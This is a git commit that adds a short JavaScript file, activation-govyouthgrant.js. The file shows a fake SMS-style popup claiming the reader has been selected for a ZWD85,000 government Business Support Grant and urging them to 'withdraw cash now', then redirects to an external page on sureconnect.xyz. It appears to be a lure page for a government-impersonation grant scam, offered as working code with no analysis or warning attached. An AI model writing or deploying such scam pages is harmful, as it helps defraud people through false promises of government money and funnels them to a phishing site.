cf7cd6c7303142774d0533563ff3c962b2116d77
ekpeitidmi <ekpeitidmi@gmail.com>
2025-05-31 22:38:52 -0700

    Create activation-govyouthgrant.js

---
+++ activation-govyouthgrant.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ZWD85,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive ZWD85,000 Business Support Grant from Government, Press Ok to withdraw cash Now ','WITHDRAW ZWD85,000');
+if (password != 'WITHDRAW ZWD85,000') {
+location.href='https://sureconnect.xyz/govyouthgrant.html';
+}
